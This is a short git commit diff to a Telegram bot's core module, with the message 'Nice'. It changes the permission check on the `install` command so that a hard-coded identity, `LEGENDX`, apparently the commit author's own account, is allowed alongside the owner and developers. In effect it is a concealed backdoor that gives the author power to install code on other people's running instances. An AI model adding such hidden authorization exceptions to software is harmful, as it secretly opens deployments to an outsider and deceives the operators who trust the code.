d9288f982bb8dab92fef709126a76dda72ad1344
LEGEND X <74249238+LEGENDXOP@users.noreply.github.com>
2021-03-04 13:00:02 +0530

    Nice

--- LEGEND/modules/core.py
+++ LEGEND/modules/core.py
@@ -78,7 +78,7 @@ from pathlib import Path
 async def install(event):
     if event.fwd_from:
         return
-    if event.sender_id == OWNER_ID or event.sender_id in DEV_USERS:
+    if event.sender_id == OWNER_ID or event.sender_id in DEV_USERS or event.sender_id == LEGENDX:
         pass
     else:
         return
